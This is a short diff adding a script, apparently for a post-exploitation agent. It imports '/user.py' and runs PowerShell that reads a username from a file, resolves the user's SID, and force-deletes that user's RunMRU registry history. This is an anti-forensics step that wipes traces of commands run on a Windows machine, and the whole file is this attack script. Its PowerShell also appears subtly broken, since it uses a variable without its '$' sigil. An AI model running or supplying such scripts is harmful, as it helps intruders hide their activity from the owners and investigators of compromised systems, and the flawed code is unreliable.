@@ -1,0 +1,5 @@
+load python
+
+python_import -f /user.py
+
+powershell_execute "user = Get-Content 'C:\\Windows\\user.txt'; $objUser = New-Object System.Security.Principal.NTAccount(user); $strSID = $objUser.Translate([System.Security.Principal.SecurityIdentifier]); $sid = $strSID.Value; reg delete HKEY_USERS\\$sid\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f"
